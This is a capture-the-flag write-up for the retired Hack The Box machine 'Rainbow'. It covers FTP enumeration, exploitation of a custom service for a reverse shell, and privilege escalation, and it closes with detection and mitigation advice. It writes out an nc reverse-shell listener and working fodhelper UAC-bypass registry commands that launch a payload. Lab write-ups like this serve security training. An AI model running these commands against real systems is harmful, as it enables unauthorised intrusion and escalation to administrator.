---
machine: Rainbow
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows
state: Retired
pwned: false
tags: [windows, ftp, uac-bypass, fodhelper, reversing]
---

# Rainbow — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real credentials or flags.

## Summary

A standalone Windows server with anonymous FTP, IIS and an application on 8080. FTP exposes `rainbow.exe`, `restart.ps1` and a developer note: the service restarts itself when the default port stops responding. The binary is analysed, the service is exploited for a shell as `rainbow`, and the `fodhelper` UAC bypass reaches administrator.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -p 21,80,135,139,445,3389,8080 -sCV <IP>
ftp anonymous@<IP>
```

```text
ftp> binary
ftp> mget *
```

`dev.txt` explains that the service restarts `rainbow.exe` and moves between ports 8080 and 8090. `index.html` is the 8080 page. `rainbow.exe` is a PE32; Ghidra reveals the service protocol.

## Initial access

The binary listens on 8080 and processes input without sufficient validation. Reproduce the flaw locally and run the exploit against the service:

```bash
python3 exploit.py <IP> 8080
nc -lnvp 443
```

The shell runs as `rainbow`, a desktop user with UAC enabled. Check:

```powershell
whoami /groups
whoami /priv
```

## Escalation

The user is in Administrators, but the process is not elevated. Use the `fodhelper` bypass, which abuses the `ms-settings` handler:

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "C:\Users\rainbow\rev.exe" /f
fodhelper.exe
```

`fodhelper.exe` auto-elevates and launches the binary. The new connection arrives as administrator.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lessons

- Anonymous FTP can leak the binary and the service restart logic.
- “Automatic restart” scripts turn a crash into controlled execution.
- Membership in Administrators does not mean the token is elevated.
- `fodhelper` remains a useful UAC bypass on unpatched Windows.

## Detection and mitigation

- Disable anonymous FTP and remove binaries from public directories.
- Alert on writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command`.
- Monitor `fodhelper.exe` launched from non-interactive processes.
- Enable `UAC: Run all administrators in Admin Approval Mode` and cumulative updates.

## References

- <https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html>
- <https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works>
- <https://attack.mitre.org/techniques/T1548/002/>
